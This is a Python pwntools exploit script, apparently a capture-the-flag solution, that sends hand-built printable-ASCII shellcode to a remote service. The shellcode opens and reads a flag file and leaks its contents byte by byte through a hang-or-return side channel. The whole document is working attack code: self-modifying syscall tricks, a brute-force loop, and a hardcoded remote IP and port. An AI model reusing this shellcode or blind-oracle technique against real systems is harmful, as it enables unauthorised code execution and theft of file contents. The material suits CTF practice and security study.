#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./chall')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

flag = ''

for i in range(0x100):
    print("i = ", i)
    for c in range(0x20, 0x7f):
        print("c = ", c)
        local = 0
        if local:
            p = process([elf.path])
        else:
            p = remote('124.16.75.162', 31051)

        #gdb.attach(p, 'pie breakpoint 0x0000000000000F18\nc')

        ch = chr(c)
        idx = chr(i+0x20)

        sh = (
            'WY' + # set rcx=&shellcode --> push rdi; pop rcx
            # fd = open('./flag') => 3
            'jAX4A5 CBC5 CCC4`,pP_' + # set rdi=0x100f0 --> push 0x41; pop rax; xor al, 0x41; xor eax, 0x43424320; xor eax, 0x43434320; xor al, 0x60; sub al, 0x70; push rax; pop rdi
            'jAX4AP^' + # set rsi=0 --> push 0x41; pop rax; xor al, 0x41; push rax; pop rsi
            'jAX0A,0A-' + # syscall --> push 0x41; pop rax; xor byte [rcx+0x2c], al; xor byte [rcx+0x2d], al
            'jAX4C' + # set rax=2 --> push 0x41; pop rax; xor al, 0x43
            'ND' + # bytes for xor syscall
            # fd = open('./flag') => 4
            'RY' + # set rcx=&shellcode --> push rdx; pop rcx
            'jAX0A>0A?' + # syscall --> push 0x41; pop rax; xor byte [rcx+0x3e], al; xor byte [rcx+0x3f], al
            'jAX4C' + # set rax=2 --> push 0x41; pop rax; xor al, 0x43
            'ND' + # bytes for xor syscall
            # read(fd, buf, 0x60)
            'P_' + # set rdi=rax --> push rax; pop rdi
            'jAX4A5@BBC5`CCCP^' + # set rsi=0x10120 --> push 0x41; pop rax; xor al, 0x41; xor eax, 0x43424240; xor eax, 0x43434360; push rax; pop rsi
            'j`Z' + # set rdx=0x60 --> push 0x60; pop rdx
            'jAX0A$0A%' + # syscall --> push 0x41; pop rax; xor byte [rcx+0x24], al; xor byte [rcx+0x25], al
            'jAX4A' + # set rax=0 --> push 0x41; pop rax; xor al, 0x41
            'ND' + # bytes for xor syscall
            # judgement
            'QX, PYjEX(A?j`X(A@' + # deadloop or return --> push rcx; pop rax; sub al, 0x20; push rax; pop rcx; sub byte [rcx+0x3f], al; sub byte [rcx+0x40], al
            'VX, PY' + # set rcx=&buf-0x20 --> push rsi; pop rax; sub al, 0x20; push rax; pop rcx
            f'j{ch}X8A{idx}' + # compare --> push ch; pop rax; cmp byte [rcx+0x20+idx], al
            'u@#' # bytes for deadloop or return
        )

        sa('Are you a master of shellcode?\n', sh.ljust(0xf0, 'A') + './flag')

        try:
            p.recv(timeout=1)
        except:
            flag += ch
            print(flag)
            p.close()
            break
        finally:
            p.close()
    if flag[i] == '}':
        break

